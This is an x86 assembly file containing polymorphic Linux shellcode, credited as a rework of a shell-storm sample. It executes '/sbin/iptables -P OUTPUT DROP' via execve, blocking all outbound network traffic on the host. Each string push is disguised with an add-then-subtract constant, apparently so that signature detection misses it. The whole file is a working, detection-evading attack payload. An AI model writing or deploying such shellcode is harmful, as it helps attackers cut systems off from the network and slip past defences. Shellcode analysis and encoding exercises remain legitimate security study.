; Filename: 1_iptables.nasm
; Author:  Zoltan Balazs
; Original shellcode: http://shell-storm.org/shellcode/files/shellcode-740.php
;
; Purpose: ///sbin/iptables -POUTPUT DROP(Policy of drop to OUTPUT chain) - polymorph

global _start			

section .text
_start:
    ;xor eax,eax
    mov ebx, eax
    xor eax, ebx

    ;xor edx,edx
    mov edx, eax

    ;push eax
    mov dword [esp-4], eax
    sub esp, 4

    ;push dword 0x504f5244
    mov esi, 0x61606355
    sub esi, 0x11111111
    mov dword [esp-4],esi
    sub esp, 4
	
    mov edi,esp
    push eax

    ;push dword 0x54555054
    mov esi, 0x65666165
    sub esi, 0x11111111
    mov dword [esp-4],esi
    sub esp, 4

    ;push dword 0x554f502d
    mov esi, 0x6660613E
    sub esi, 0x11111111
    mov dword [esp-4],esi
    sub esp, 4

    mov ecx,esp
    push eax
    ;push dword 0x73656c62
    mov esi, 0x84767D73
    sub esi, 0x11111111
    mov dword [esp-4],esi
    sub esp, 4


    ;push dword 0x61747069
    mov esi, 0x7285817A
    sub esi, 0x11111111
    mov dword [esp-4],esi
    sub esp, 4

    ;push dword 0x2f6e6962
    mov esi, 0x407F7A73
    sub esi, 0x11111111
    mov dword [esp-4],esi
    sub esp, 4

    ;push dword 0x732f2f2f
    mov esi, 0x84404040
    sub esi, 0x11111111
    mov dword [esp-4],esi
    sub esp, 4


    mov ebx,esp
    push eax
    push edi
    push ecx
    push ebx
    mov ecx,esp
    xor edx,edx
    mov al,0xb
    int 0x80




